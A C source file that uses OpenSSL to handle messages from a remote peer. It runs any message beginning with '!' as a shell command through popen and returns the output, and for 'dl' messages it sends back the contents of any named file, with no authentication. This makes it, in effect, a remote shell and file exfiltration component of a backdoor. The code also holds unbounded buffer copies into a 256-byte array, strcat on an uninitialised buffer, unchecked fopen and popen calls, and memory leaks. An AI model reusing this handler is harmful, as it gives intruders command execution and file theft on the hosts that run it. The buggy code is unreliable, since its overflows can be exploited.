#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/crypto.h>
#include <openssl/x509.h>
#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#define BUFSIZE 256

struct output {
	char* line;
	int length;
	struct output *next;
};

struct output *createOutput(int length, char *line){
	struct output* ptr;
	ptr = malloc(sizeof(struct output));
	ptr->line = malloc(length+1);
	strcpy(ptr->line, line);
	ptr->line[length]='\0';
	ptr->length = length;
	printf("Length:  %d \n", length);
	ptr->next = NULL;
	return ptr;
}

struct output * append(struct output * end, struct output * newOutptr) {
    end->next = newOutptr;
//    printf("%s", newOutptr->line);
//    printf(" pointer: %p : ", end->next);
    return(end->next);
    
}

void printOutput(struct output *start) {
    struct output * ptr = start;
    while (ptr!=NULL) {
        printf("%s", ptr->line);
//	printf(" pointer: %p : ", ptr->next);
        ptr = ptr->next;
    }
}

void returnOutput(struct output *start) {
    struct output * ptr = start;
    while (ptr!=NULL) {
        printf("%s", ptr->line);
//	printf(" pointer: %p : ", ptr->next);
        ptr = ptr->next;
    }
}

void freeList(struct output *start) {
    struct output * ptr = start;
    struct output * tmp;
    while (ptr!=NULL) {
        tmp = ptr->next;
        free(ptr);
        ptr = tmp;
    }
}

struct output* call(char *cmd, int * size){
	char buf[BUFSIZE];
	FILE *fp;
	int buffer = 0;
	int length = 0;
	struct output *start, *newOutptr, *end;
	/*printf("cmd received: ");
	fputs(cmd, stdout);
	sleep(10);
	printf(";");*/
	if ((fp = popen(cmd, "r")) == NULL) {
		printf("Error opening pipe!\n");
		start = NULL;
	}

	while (fgets(buf, BUFSIZE, fp) != NULL) {

		//buffer = length of output
		for(buffer = 0; buf[buffer] !='\0'; buffer++){
//			buffer++;
		}
		if(length == 0){
			start = createOutput(buffer, buf);
			end = start;
		}
		else{
			newOutptr = createOutput(buffer, buf);
			end = append(end, newOutptr);
		}
/*		array[length] = (char *) malloc(buffer * sizeof(char));
		strcpy(array[length], buf);
		printf("bufsize: %d\n", buffer);
		printf("%s", array[length]);*/
//		printf("%d", length);
//		printOutput(start);

		length++;
		*size = *size + buffer;
	}

	if(pclose(fp))  {
		printf("Command not found or exited with error status\n");
		start = NULL;
	}
	return start;
}


void handleResponse(char * response, SSL* socket){
        char * ptr = response;
        int size;
        size = 0;
        struct output * start;
        char message[256] = "The client sent: ";
        int orig_len = strlen(message);
        int i, j;
        i = 0;
        j = 0;
	FILE * fp;
	int total = 0;
	char line[250];
        if(response[0]=='!'){
                start = call(ptr+1, &size);
                if (start == NULL)
                        printf("error");
                else{
                        printf("%d",size);
                        sendOutput(start, socket, &size);
                        freeList(start);
                }
        }
        else {
		if(strncmp(response, "dl", 2)==0){
			char fileContent[4096];
				printf("%s", ptr+3);
				fp = fopen( strtok(ptr+3, "\n"), "r");
				while(fgets(line, 250, fp)!=NULL){
					total = total + strlen(line);
					if(total >= 4096){
						SSL_write(socket, fileContent, sizeof(fileContent));
						memset(fileContent, 0, strlen(fileContent));
						total = 0;
					}
					strcat(fileContent, line);
				}
						SSL_write(socket, fileContent, sizeof(fileContent));
		}
                //Copying string 2 to the end of string 1
                for(i=orig_len;response[j]!='\0';i++)
                  {
                     message[i]=response[j];
                     j++;
                  }
                message[i]='\0';
                j = 0;
                SSL_write(socket, message, strlen(message)); 
                message[orig_len] ='\0';
        }
        if(!(strncmp("exit", response, 4))){
                printf("exiting");
        }
	
}
void sendOutput(struct output *start, SSL* socket, int * size) {
    struct output * ptr = start;
    char message[*size];
    memset(message, 0, sizeof(message));
    while (ptr!=NULL) {
        printf("%s", ptr->line);
        strcat(message, ptr->line);
        printf(" pointer: %p : ", ptr->next);
        ptr = ptr->next;
    }   
    SSL_write(socket, message, sizeof(message)); 
    printf("returning to function");
}
